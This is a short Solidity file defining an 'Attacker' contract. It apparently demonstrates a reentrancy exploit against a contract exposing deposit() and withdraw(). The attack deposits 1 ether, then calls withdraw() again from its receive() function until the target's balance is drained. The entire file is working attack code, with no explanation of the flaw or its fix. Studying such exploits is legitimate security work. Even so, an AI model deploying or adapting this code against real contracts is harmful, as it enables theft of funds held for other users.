// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerable public target;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need ETH");

        // Step 1: deposit into vulnerable contract
        target.deposit{value: 1 ether}();

        // Step 2: start attack
        target.withdraw();
    }

    // 🔥 THIS IS THE KEY PART
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
}